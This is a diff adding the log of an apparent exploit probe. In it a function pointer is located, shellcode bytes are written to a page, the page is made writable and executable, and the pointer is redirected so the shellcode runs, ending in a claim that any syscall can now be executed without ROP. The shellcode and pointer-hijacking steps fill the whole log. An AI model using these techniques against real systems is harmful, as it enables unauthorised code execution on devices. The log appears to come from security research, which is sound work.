@@ -1,0 +1,42 @@
+=== PROBE 44a: MTYPEPROTECT EXECUTION TEST ===
+
+pid: 121
+
+=== A: LOCATE FN_ADDR ===
+fn_addr ptr: 0x311305fd0
+ropchain: 0x3113060f0
+fn_addr original: 00009FE5_11308130
+
+=== B: SHELLCODE PAGE ===
+page addr: 00000003_113C4000
+shellcode1 written: B8 41414141 C3 (mov eax,0x41414141; ret)
+verify: 414141B8
+shellcode2 at +0x100: 31C0 B014 C3 (xor eax,eax; mov al,20; ret)
+shellcode3 at +0x200: NOP sled + ret (safest test)
+
+=== C: MTYPEPROTECT TO RWX ===
+mtypeprotect(RWX, 3-arg): ret=1
+mtypeprotect(RW->RWX, 4-arg): ret=1
+still readable: YES
+still writable: YES
+
+=== D: EXECUTION TEST 1 - NOP SLED ===
+redirecting fn_addr to NOP sled at page+0x200...
+fn_addr now: 00000003_113C4200
+nop_sled result: ok=true ret=121 (0x79)
+*** PAGE IS EXECUTABLE! NOP SLED SURVIVED! ***
+
+=== E: EXECUTION TEST 2 - MOV EAX ===
+mov_eax result: ok=true ret=121 (0x79)
+executed but unexpected return value
+
+=== F: EXECUTION TEST 3 - DIRECT SYSCALL ===
+syscall result: ok=true ret=121
+*** DIRECT SYSCALL EXECUTION WORKS ***
+*** CAN NOW EXECUTE ANY SYSCALL WITHOUT ROP ***
+
+=== G: CLEANUP ===
+fn_addr restored: 00009FE5_11308130
+getpid after restore: ok=true ret=121
+
+=== PROBE 44a COMPLETE ===
